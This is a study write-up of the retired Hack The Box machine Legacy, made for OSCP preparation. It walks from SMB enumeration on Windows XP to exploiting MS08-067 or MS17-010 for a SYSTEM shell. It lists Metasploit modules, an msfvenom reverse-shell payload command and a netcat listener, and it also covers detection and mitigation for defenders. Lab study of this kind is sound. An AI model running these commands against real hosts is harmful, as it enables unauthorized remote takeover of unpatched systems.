# HTB — Legacy

> **Authorized lab only.** Legacy is a *retired* Hack The Box machine for OSCP-style learning. The vulnerabilities below (MS08-067, MS17-010) are 8–17 years old and fully patched. Use only on this lab box or systems you are authorized to test.

---

## Machine Overview

| Field | Value |
|-------|-------|
| Machine Name | Legacy |
| Operating System | Windows XP (SP2/SP3-era) |
| Difficulty | Easy |
| Key Learning Objectives | SMB enumeration, mapping old Windows to MS-numbered CVEs, SMB vuln NSE scripts, direct-to-SYSTEM SMB exploitation, classic exam-pattern Windows box |
| Technologies Observed | Windows XP, SMB (NetBIOS 139 / Direct 445) |

---

## Initial Enumeration

### Host Discovery

```bash
export IP=10.10.10.4
ping -c1 $IP        # TTL ~128 → Windows
```
Use `-Pn` if ICMP is filtered.

### Nmap Results

```bash
nmap -p- --min-rate 10000 -Pn -n --open -oN scans/allports.txt $IP
nmap -sC -sV -p139,445 -oN scans/detail.txt $IP
nmap --script "smb-os-discovery,smb-vuln-ms08-067,smb-vuln-ms17-010" -p139,445 $IP
```

| Port | Protocol | Service | Version | Notes |
|------|----------|---------|---------|-------|
| 139 | TCP | NetBIOS-SSN | Microsoft Windows netbios-ssn | Legacy SMB transport |
| 445 | TCP | SMB | Windows XP microsoft-ds | **Primary vector** — MS08-067 and MS17-010 both apply |
| 3389 | TCP | RDP | (often closed/filtered) | Not the path |

**Why each service matters:**
- **139/445 SMB on Windows XP** — XP is long out of support. SMB on this OS is vulnerable to **MS08-067** (CVE-2008-4250, NetAPI RCE) and typically **MS17-010** (EternalBlue, CVE-2017-0144). Either yields code execution as **NT AUTHORITY\SYSTEM**.
- `smb-os-discovery` confirms the XP version and build, which drives CVE selection.

---

## Service Analysis

### SMB (139/445) — Windows XP
- **What:** Windows file/printer sharing + the Server service (NetAPI).
- **Why exposed:** Default Windows networking left reachable.
- **Security implications:**
  - **MS08-067:** A crafted RPC request to the Server service (`srvsvc`) triggers a stack overflow → pre-auth RCE as SYSTEM.
  - **MS17-010 (EternalBlue):** A flaw in SMBv1 handling allows pre-auth RCE as SYSTEM.
- **Enumeration workflow:**
  ```bash
  smbclient -L //$IP/ -N
  nmap --script smb-os-discovery -p445 $IP
  nmap --script smb-vuln-ms08-067 -p445 $IP
  nmap --script smb-vuln-ms17-010 -p445 $IP
  ```
- **Interesting observations:** The NSE vuln scripts return `VULNERABLE` for the applicable CVE — a clear, unambiguous signal of the path.

---

## Attack Surface Assessment

| Category | Finding |
|----------|---------|
| Network services | SMB over 139/445 exposed |
| Authentication | Pre-auth RCE — no credentials required |
| Legacy software | Windows XP, end-of-life, unpatched SMBv1 |
| Misconfigurations | SMBv1 enabled; no network segmentation of a legacy host |
| Security weaknesses | MS08-067 and/or MS17-010 → SYSTEM |

---

## Enumeration Timeline

1. **Initial recon** — Scan shows 139/445; TTL and `smb-os-discovery` confirm Windows XP.
2. **Service investigation** — Old Windows + SMB immediately suggests MS-series SMB CVEs.
3. **Validation** — `smb-vuln-ms08-067` / `smb-vuln-ms17-010` NSE scripts report `VULNERABLE`; `searchsploit ms08-067` / `ms17-010` confirm public exploits.
4. **Findings** — Pre-auth RCE as SYSTEM via SMB.
5. **Lessons learned** — Windows version alone narrows the CVE set fast; verify with NSE before committing to an exploit; pick the more reliable of the two for the target OS.

---

## User Access Learnings

Like Lame, Legacy has **no separate low-priv stage** — the SMB exploit returns a SYSTEM shell directly, so both `user.txt` and `root.txt` are readable immediately.

- **Discovery process:** Map Windows XP + SMBv1 → MS08-067 / MS17-010.
- **Enumeration logic:** NSE vuln scripts confirm which CVE the target is susceptible to before you choose an exploit.
- **Key indicators:** `smb-os-discovery` = Windows XP; `smb-vuln-*` = `VULNERABLE`.
- **High-level exploitation:** Set up a listener, then launch the matching public exploit so SMB executes shellcode that connects back:
  ```bash
  nc -lvnp 4444
  ```
  - **Metasploit path:** `use exploit/windows/smb/ms08_067_netapi` (or `ms17_010_psexec`/`eternalblue`), set `RHOSTS`/`LHOST`, `run`.
  - **Manual path (OSCP-preferred):** Use a public standalone script (e.g. an MS17-010 or MS08-067 PoC) configured with your reverse-shell payload generated via `msfvenom` (e.g. `windows/shell_reverse_tcp`). The exploit injects into the SMB service, which runs as SYSTEM, so the returned shell is SYSTEM.

> **OSCP note:** MS08-067 target selection (the correct OS/SP/language offset) is a classic "manual exploit" lesson — pick the right target index or the box crashes. Practice the non-MSF route.

---

## Privilege Escalation Learnings

- No escalation required: the SMB service runs as **NT AUTHORITY\SYSTEM**, so the foothold already is the highest privilege.
- **Verify:** `whoami` → `nt authority\system`.
- **Enumeration (good habit even here):** `systeminfo`, `whoami /priv`, `net users`.
- **Security lessons:** A single unpatched network service on a legacy OS = total compromise; patching discipline and decommissioning EOL systems are the real fixes.
- **Hardening opportunities:** disable SMBv1, patch, isolate/retire legacy hosts.

---

## Detection Opportunities (Blue Team)

| Signal | Where to look |
|--------|---------------|
| Log sources | Windows Security/System event logs, SMB audit logs |
| Network indicators | Anomalous SMB traffic to 445; crafted `srvsvc` RPC (MS08-067) or SMBv1 trans2 patterns (MS17-010); outbound connect-back to attacker:4444 |
| Security events | `services.exe`/SMB service spawning `cmd.exe`; unexpected SYSTEM process creation |
| Monitoring recs | IDS/IPS signatures for MS08-067 and EternalBlue; alert on SMBv1 use; egress filtering to block reverse shells; flag EOL OS on the network |

---

## Mitigations

| Area | Recommendation |
|------|----------------|
| Configuration | Disable SMBv1; restrict SMB to required hosts via firewall |
| Hardening | Remove/retire Windows XP; network-segment any unavoidable legacy host |
| Patching | Apply MS08-067 and MS17-010 patches (and migrate off EOL OS entirely) |
| Monitoring | SMB-focused IDS, EOL-asset inventory, process-ancestry alerting |

---

## OSCP Exam Takeaways

- **Enumeration lessons:** OS fingerprint drives CVE selection; confirm with NSE vuln scripts before exploiting.
- **Common exam patterns:** Legacy Windows + SMB = MS-series RCE to SYSTEM; the "pick the right exploit target/offset" skill.
- **Similar machine types:** Any unpatched Windows SMB host (e.g. Blue for MS17-010).
- **Key commands worth remembering:**
  ```bash
  nmap --script smb-os-discovery,smb-vuln-ms08-067,smb-vuln-ms17-010 -p445 $IP
  searchsploit ms08-067
  searchsploit ms17-010
  msfvenom -p windows/shell_reverse_tcp LHOST=<you> LPORT=4444 -f <fmt>
  nc -lvnp 4444
  ```

---

## Personal Notes Section

> Append your own screenshots, alternative techniques, and research below.

### Screenshots
- [ ]

### Custom Notes
-

### Alternative Techniques
- MS17-010 manual (no-MSF) exploitation:
- MS08-067 target-offset selection notes:

### Additional Research
- CVE-2008-4250 (MS08-067):
- CVE-2017-0144 (MS17-010 / EternalBlue):

### Sample Writeups (reference)
- [7h3rAm / svachal writeup](samples/Legacy-7h3rAm-writeup.md) — phased enumeration→exploitation→SYSTEM flow; MS08-067 (NetAPI) via Metasploit.
- teckk2: <https://teckk2.github.io/writeup/2017/12/18/Legacy.html>
- hackersnotes: <https://hackersnotes.com/walkthrough-legacy-htb-retired-box/>
